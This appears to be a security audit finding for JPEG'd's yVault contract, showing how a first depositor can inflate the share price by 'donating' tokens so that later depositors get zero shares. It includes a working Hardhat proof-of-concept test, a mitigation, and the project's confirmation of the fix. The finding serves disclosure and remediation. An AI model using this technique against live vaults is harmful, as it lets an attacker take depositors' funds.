@@ -1,0 +1,13 @@
+[H-01] yVault: First depositor can break minting of shares
+Submitted by hickuphh3, also found by 0xDjango, berndartmueller, cmichel, hyh, and WatchPug
+yVault.sol#L148-L153
+The attack vector and impact is the same asTOB-YEARN-003, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.
+Proof of Concept
+Attacker deposits 1 wei to mint 1 shareAttacker transfers exorbitant amount to theStrategyPUSDConvexcontract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when itsdeposit()function is called.Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.
+Insert this test intoyVault.ts.
+it.only("will cause 0 share issuance",async()=>{// mint 10k + 1 wei tokens to user1// mint 10k tokens to ownerletdepositAmount=units(10_000);awaittoken.mint(user1.address,depositAmount.add(1));awaittoken.mint(owner.address,depositAmount);// token approval to yVaultawaittoken.connect(user1).approve(yVault.address,1);awaittoken.connect(owner).approve(yVault.address,depositAmount);// 1. user1 mints 1 wei = 1 shareawaityVault.connect(user1).deposit(1);// 2. do huge transfer of 10k to strategy// to greatly inflate share price (1 share = 10k + 1 wei)awaittoken.connect(user1).transfer(strategy.address,depositAmount);// 3. owner deposits 10kawaityVault.connect(owner).deposit(depositAmount);// receives 0 shares in returnexpect(awaityVault.balanceOf(owner.address)).to.equal(0);// user1 withdraws both his and owner's deposits// total amt: 20k + 1 weiawaitexpect(()=>yVault.connect(user1).withdrawAll()).to.changeTokenBalance(token,user1,depositAmount.mul(2).add(1));});
+Recommended Mitigation Steps
+Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case i.e. whentotalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.Ensure the number of shares to be minted is non-zero:require(_shares != 0, "zero shares minted");
+spaghettieth (JPEG’d) confirmed, but disagreed with High severity
+spaghettieth (JPEG’d) resolved and commented:
+Fixed injpegd/core#16.
